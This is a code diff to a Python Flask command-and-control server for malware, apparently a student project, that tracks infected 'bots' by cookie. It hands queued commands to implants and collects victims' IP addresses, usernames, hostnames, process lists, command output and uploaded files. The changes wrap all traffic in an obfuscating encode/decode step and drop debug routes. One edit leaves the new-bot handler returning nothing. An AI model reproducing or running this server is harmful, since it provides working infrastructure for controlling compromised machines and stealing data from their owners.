@@ -48,12 +48,12 @@ def heartbeat():
 
         if 'X-Session-ID' not in request.cookies:
             print("New checkin at " + str(checkin))
-            resp = flask.Response(str(checkin))
+            resp = flask.Response(mal_encode(app.malware_key, str(checkin)))
             bot_id = uuid.uuid1()
             print("Adding new UUID to db:" + str(bot_id))
             resp.set_cookie("X-Session-ID", str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
             dbmain.add_bot_to_db(conn, bot_id, checkin)
-            return resp
+            return
         else:
             id = request.cookies['X-Session-ID']
             dbmain.add_bot_to_db(conn, id, checkin)
@@ -63,8 +63,8 @@ def heartbeat():
             if command != "":
                 print("Command to execute: ", command)
                 dbmain.update_commandqueue(conn, id, "")
-                return command
-        return "1"
+                return mal_encode(app.malware_key, command)
+        return mal_encode(app.malware_key, "1")
 
 
 @app.route('/info', methods=['POST'])
@@ -77,11 +77,14 @@ def info():
     if request.method == 'POST':
         if 'X-Session-ID' not in request.cookies:
             print('No cookie found - cannot update info')
-            print(request.data.decode().split('&'))
+            return mal_encode(app.malware_key, "Error: no cookie")
         else:
             id = request.cookies['X-Session-ID']
+            d = mal_decode(app.malware_key, request.data)
             conn = get_db()
-            spltdata = (request.data.decode().split('&'))
+
+            spltdata = d.split('&')
+            print(spltdata)
             dbmain.update_ip(conn, id, spltdata[0])
             dbmain.update_username(conn, id, spltdata[1])
             dbmain.update_devicename(conn, id, spltdata[2])
@@ -89,7 +92,7 @@ def info():
             dbmain.update_memory(conn, id, spltdata[4])
             dbmain.update_networkaddresses(conn, id, spltdata[5])
             dbmain.update_os(conn, id, spltdata[6])
-        return "yeet"
+            return mal_encode(app.malware_key, "Success")
 
 @app.route('/ps', methods=['POST'])
 def ps():
@@ -101,12 +104,13 @@ def ps():
     if request.method == 'POST':
         if 'X-Session-ID' not in request.cookies:
             print('No cookie found - cannot update info')
+            return mal_encode(app.malware_key, "Error: no cookie")
         else:
             print(request.cookies['X-Session-ID'])
             conn = get_db()
-            proc_string = request.data.decode()
+            proc_string = mal_decode(app.malware_key, request.data)
             dbmain.update_proclist(conn, request.cookies['X-Session-ID'], proc_string)
-        return "ps"
+            return mal_encode(app.malware_key, "Successfully updated process list")
 
 
 @app.route('/upload', methods=['POST'])
@@ -119,12 +123,12 @@ def upload():
     if request.method == 'POST':
         # check if the post request has the file part
         if 'file' not in request.files or 'X-Session-ID' not in request.cookies:
-            return 'error'
+            return mal_encode(app.malware_key, "Error with file upload")
         file = request.files['file']
         # if user does not select file, browser also submit an empty part without filename
         if file.filename == '':
             print('No selected file')
-            return 'error'
+            return mal_encode(app.malware_key, "Error with file upload")
         if file:
             filename = secure_filename(str(int(time.time())) + "_" + file.filename)
             cookiename = secure_filename(request.cookies['X-Session-ID'])
@@ -132,8 +136,8 @@ def upload():
             if not os.path.exists(dir):
                 os.makedirs(dir)
             file.save(os.path.join(dir, filename))
-            return 'success'
-    return 'maybe'
+            return mal_encode(app.malware_key, "Successfully uploaded file")
+    return mal_encode(app.malware_key, "Something went wrong")
 
 
 @app.route('/out', methods=['POST'])
@@ -145,39 +149,13 @@ def out():
     if request.method == 'POST':
         if 'X-Session-ID' not in request.cookies:
             print('No cookie found - cannot update info')
+            return mal_encode(app.malware_key, "Error: no cookie")
         else:
             print(request.cookies['X-Session-ID'])
             conn = get_db()
-            out_string = request.data.decode()
+            out_string = mal_decode(app.malware_key, request.data)
             dbmain.update_commandout(conn, request.cookies['X-Session-ID'], out_string)
-        return "out"
+            return mal_encode(app.malware_key, "Output updated successfully")
 
 
-@app.route('/echo', methods=['POST'])
-def echo():
-    if request.method == 'POST':
-        if 'X-Session-ID' not in request.cookies:
-            print('No cookie found - cannot update info')
-            print(request.data.decode().split('&'))
-        else:
-            id = request.cookies['X-Session-ID']
-            print(id)
-            spltdata = (request.data.decode().split('&'))
-            for d in spltdata:
-                print(d)
-        return "yeet"
 
-
-@app.route('/decode', methods=['POST'])
-def dcde():
-    key = "CSEC476"
-    if request.method == 'POST':
-        if 'X-Session-ID' not in request.cookies:
-            print('No cookie found - cannot update info')
-            print(request.data.decode().split('&'))
-        else:
-            id = request.cookies['X-Session-ID']
-            print(id)
-            d = mal_decode(key, request.data)
-            print(d)
-        return mal_encode(key, "yeet")
